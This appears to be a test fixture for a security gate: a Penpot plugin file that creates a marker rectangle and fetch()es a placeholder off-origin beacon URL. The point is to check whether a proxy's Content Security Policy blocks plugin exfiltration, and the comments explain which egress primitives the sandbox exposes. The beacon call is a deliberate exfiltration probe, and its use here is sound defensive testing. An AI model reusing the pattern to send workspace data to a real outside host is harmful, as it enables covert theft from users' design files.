/*
 * E7 fixture plugin (scripts/e7-plugins-spike.sh).
 *
 * Two unambiguous observables, executed the moment Penpot's own plugin
 * runtime evaluates this file:
 *
 *   1. WORKSPACE EFFECT — creates a rectangle named E7-FIXTURE-SHAPE in the
 *      open file (requires the content:write permission the user granted at
 *      Penpot's native consent prompt). The gate asserts it via the get-file
 *      RPC, independent of any UI.
 *   2. CSP-EGRESS PROBE — fetch()es ONE off-origin beacon (`src=fetch`). This
 *      is the connect-src exfiltration vector — and, as it turns out, the ONLY
 *      egress primitive a plugin has: Penpot evaluates plugin.js in a hardened
 *      SES `Compartment` that endows `fetch` but NOT `Image`/`document`/`window`
 *      (an `new Image()` throws "Image is not a constructor" in-sandbox — see
 *      the plugin-supply-chain doc). The img-src exfil VECTOR is therefore
 *      probed at the SPA-DOCUMENT level by the gate's browser leg (a
 *      page-context `new Image().src`), which is exactly the level the proxy
 *      CSP applies to. With the CSP OFF both leave; with it ON both are fenced.
 *
 * @BEACON_URL@ is substituted by the gate when it authors the package into
 * the vault's .penpot-packages/ home.
 */
console.log("[E7-FIXTURE] plugin.js evaluating");

try {
  var rect = penpot.createRectangle();
  rect.name = "E7-FIXTURE-SHAPE";
  rect.resize(120, 80);
  console.log("[E7-FIXTURE] created shape E7-FIXTURE-SHAPE id=" + rect.id);
} catch (e) {
  console.log("[E7-FIXTURE] shape creation FAILED: " + String(e));
}

// The connect-src exfiltration vector (the only network primitive a plugin's
// SES Compartment exposes).
fetch("@BEACON_URL@?src=fetch&t=" + Date.now()).then(
  function (r) {
    console.log("[E7-FIXTURE] beacon egress SUCCEEDED status=" + r.status);
  },
  function (e) {
    console.log("[E7-FIXTURE] beacon egress BLOCKED: " + String(e));
  }
);
